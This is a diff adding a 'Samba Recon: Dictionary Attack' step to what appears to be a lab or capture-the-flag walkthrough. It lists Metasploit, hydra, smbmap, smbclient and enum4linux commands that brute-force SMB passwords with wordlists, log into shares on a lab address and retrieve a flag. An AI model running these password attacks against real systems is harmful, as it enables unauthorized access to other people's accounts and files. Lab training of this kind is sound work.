@@ -180,6 +180,32 @@ cat flag
 12)  Samba Recon: Dictionary Attack
 
 ```
+msfconsole
+use auxiliary/scanner/smb/smb_login
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+set SMBUser jane
+set RHOSTS 192.212.251.3
+exploit
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.212.251.3 smb
+smbmap -H 192.212.251.3 -u admin -p password1
+smbclient -L 192.212.251.3 -U jane
+smbclient //192.212.251.3/jane -U jane
+smbclient //192.212.251.3/admin -U admin
+ls
+cd hidden
+ls
+get flag.tar.gz
+exit
+tar -xf flag.tar.gz
+cat flag
+msfconsole
+use auxiliary/scanner/smb/pipe_auditor
+set SMBUser admin
+set SMBPass password1
+set RHOSTS 192.212.251.3
+exploit
+enum4linux -r -u "admin" -p "password1" 192.212.251.3
 
 ```
 
